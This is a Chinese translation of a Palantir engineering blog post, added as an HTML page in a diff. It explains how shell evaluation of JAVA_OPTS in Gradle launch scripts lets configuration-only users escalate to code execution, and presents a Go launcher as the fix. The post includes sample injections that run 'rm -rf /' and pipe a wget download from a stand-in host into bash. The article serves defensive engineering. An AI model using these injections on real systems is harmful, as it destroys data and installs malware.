@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Launching Java Applications Securely</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;max-width:680px;margin:0 auto;padding:40px 20px;line-height:1.7;color:#242424}
+h1{font-size:1.8em}
+img{max-width:100%;height:auto}
+pre{overflow-x:auto;background:#f5f5f5;padding:16px}
+</style>
+</head>
+<body>
+<article>
+# 安全启动 Java 应用程序
+
+![Palantir](https://miro.medium.com/v2/resize:fill:32:32/1*yFp1VmXHPcrYrYrDNlD_7A.png)
+
+[Palantir](https://palantir.medium.com/?source=post_page---byline--f737f2755e0f---------------------------------------)
+
+Follow
+
+5 min read · Nov 19, 2016
+
+16
+
+![](https://miro.medium.com/v2/resize:fit:700/1*hQMxZXoKtwaQ41vd4tAKgQ.png)
+
+在我们的软件部署系统中，*产品配置* 和 *本地系统访问*（例如通过 SSH）是分离的权限，我们倾向于将系统访问权限限制在少数基础设施管理员手中。我们的设置要求配置基于 Java 服务的用户能够修改 JVM 设置。本文表明，通过 shell 脚本和环境变量启动 Java 服务的标准模板方法，实际上会向具有配置权限的用户授予系统访问权限。这种攻击的机制并不特别令人惊讶或复杂，但仍代表了一个可以避免的攻击媒介。为了应对这种隐蔽的权限提升，我们倾向于使用自定义的 Java 启动器来确保程序参数经过净化处理，而不是使用我们以前使用的标准 Gradle 分发脚本。
+
+## 启动应用程序
+
+在本文的语境中，*启动应用程序* 是指从 Linux shell 启动一个 (Java) 程序的过程。启动应用程序最简单的方法是使用所需的参数调用 `java` 二进制文件，包括 JVM 选项、类路径、主类和程序参数。任何非简单的应用程序都会使用打包机制，允许开发者声明源代码、依赖项和配置，并生成一个包含已编译程序和一组 *启动脚本* 的制品，这些脚本将 `java` 调用的内部细节封装成用户友好的可执行脚本。例如，Gradle 的 Java 应用程序插件会生成一个 `bin/my-app` shell 脚本，执行 `bin/my-app` 即可启动应用程序的主类。
+
+查看 Gradle 生成的 shell 脚本内部，我们发现它最终调用了
+
+```
+exec "$JAVACMD" "${JVM_OPTS[@]}" -classpath "$CLASSPATH" myapp.MyApp "$@"
+```
+
+其中 `JVM_OPTS` 本身派生自 `JAVA_OPTS` 环境变量。这允许用户为 JVM 提供运行时参数，例如程序可用的最大堆内存量：
+
+```
+JAVA_OPTS="-Xmx64m" bin/my-app
+```
+
+由于脚本在当前 shell 中解释 `JAVA_OPTS` 变量，上述操作在功能上等同于
+
+```
+JAVA_OPTS="`echo '-Xmx64m'`" bin/my-app
+```
+
+不幸的是，它也等同于
+
+```
+JAVA_OPTS="`rm -rf / && echo '-Xmx64m'`" bin/my-app
+```
+
+甚至等同于
+
+```
+JAVA_OPTS="`wget -O - http://my-virus | bash && echo '-Xmx64m'`" bin/my-app
+```
+
+即具备执行任意代码或部署恶意软件的能力。
+
+## 通过启动脚本进行权限提升
+
+当通过 shell 访问启动程序时，这种行为（包括作为启动过程的一部分运行任意代码的能力）当然并不十分令人意外。但当程序通过一个将用户权限划分为“提供并安装程序二进制文件”、“配置程序”、“启动/停止程序”和“使用程序”的部署系统进行安装和启动时，情况就稍微复杂一些了。在这个模型中，安装程序的能力严格强于配置程序的能力。具体而言，更改程序二进制文件的能力意味着能够在指定机器上执行任意代码，而配置程序的能力允许用户更改通常由程序自身净化和验证的参数，例如线程池大小、数据库访问凭证等。
+
+为了限制用户凭证泄露后的波及范围，我们将安装应用程序的权利限制在部署系统内，不授予用户甚至服务管理员通过 SSH 登录机器的权利。服务管理员的权限仅限于通过部署界面工具更改服务配置以及启动/停止/重启服务。因此，任何允许服务管理员执行任意代码的服务配置机制都应被视为权限提升。特别是，鉴于上面的例子，我们决不能让用户为通过 Gradle 启动脚本启动的服务设置 JAVA_OPTS。
+
+## 通过显式配置防止权限提升
+
+我们的 [gradle-java-distribution 插件](https://github.com/palantir/gradle-java-distribution) 是 Gradle 原生 [分发插件](https://docs.gradle.org/current/userguide/distribution_plugin.html) 的替代方案。它通过净化配置参数而不是将其作为 shell 表达式求值，来防止所描述的权限提升。插件用户可以通过标准的 Gradle 扩展在编译时访问固定的配置选项列表：
+
+```
+// build.gradle
+distribution {
+  mainClass 'foo.bar.MyServiceMainClass'
+  args 'server', 'var/conf/my-service.yml'
+  defaultJvmOpts '-Xmx1g'
+  defaultJvmOpts '-Xms1g'
+}
+```
+
+插件将配置渲染到 `launcher-static.yml` 文件中，如下所示：
+
+```
+mainClass: foo.bar.MyServiceMainClass
+classpath:
+  - ./foo.jar
+  - ... (list of Jars is taken from the Gradle configuration)
+jvmOpts:
+  - '-Xmx1g'
+  - '-Xms1g'
+args:
+  - server
+  - var/conf/my-service.yml
+```
+
+`launcher-static.yml` 文件包含在 TGZ/ZIP 分发包中，连同读取该 YAML 文件并（通过 `exec()` 系统调用）执行带有指定 JVM 和程序参数的 `java` 二进制文件的 [Go 二进制文件](https://github.com/palantir/go-java-launcher) 一起发布，即大致如下：
+
+```
+/absolute/path/to/java
+  -Xmx1g -Xms1g \
+  -classpath /absolute/path/to/foo.jar \
+  foo.bar.MyServiceMainClass \
+  server var/conf/my-service.yml
+```
+
+由于所有配置都被解释为逐字字符串并直接传递给 `exec()` 系统调用，这种启动机制防止了所描述的权限提升。
+
+我们选择 [Go](https://golang.org/) 来实现启动器；我们在 Go 方面积累的机构知识比在 Bash 方面更多，因此认为它更适合我们的目的。与操作系统无关的 shell 脚本相比，这种选择的一个缺点是耦合了一个预编译的、依赖操作系统的启动器二进制文件。Gradle 插件目前为我们的标准开发和生产环境提供了 MacOS 和 Linux 二进制文件。
+
+## 分离编译时与运行时配置
+
+`launcher-static.yml` 机制允许代码作者指定运行时参数；缺失的部分是让服务管理员能够在运行时覆盖或扩充此类配置，同时不危及上述 *安装* 和 *配置* 二进制文件之间的权限分离。我们的部署系统将二进制文件安装到一个目录结构中，使我们能够区分不可变配置和可变配置：
+
+```
+/some/prefix/my-service/
+    # immutable, fixed at compile time; read-only for service administrators
+    service/
+        bin
+            go-java-launcher
+            launcher-static.yml
+        lib/
+            foo.jar
+            ...
+    # mutable at run time; service administrators have write access
+    var/
+        conf/
+            launcher-custom.yml
+            my-service.yml
+        data/
+```
+
+部署系统将程序 JAR 文件与启动器二进制文件及静态配置一起安装在 `service/` 目录中，该目录在安装后被视为不可变。相反，它将可变的、用户定义的配置渲染到 `var/` 目录中，包括特定于服务的配置文件 (`my-service.yml`) 和额外的启动器配置文件 (`launcher-custom.yml`)。值得注意的是，`launcher-custom.yml` 不提供更改程序类路径的机制；这意味着服务管理员无法更改程序二进制文件。这种设置的另一个优势是，部署系统可以在不影响程序配置的情况下升级程序二进制文件。
+
+## 在您的收件箱中获取 Palantir 的故事
+
+免费加入 Medium，获取此作者的更新。
+
+输入您的电子邮件
+
+订阅
+
+订阅
+
+登录时记住我
+
+作者：[Robert F.](https://github.com/uschi2000)
+
+*Gradle Java Distribution 是一个开源的 Gradle 插件，可在* [https://github.com/palantir/gradle-java-distribution](https://github.com/palantir/gradle-java-distribution) *获取。演示本文所述行为的源代码可在* [https://github.com/uschi2000/distribution-example](https://github.com/uschi2000/distribution-example) *获取。*
+</article>
+</body>
+</html>
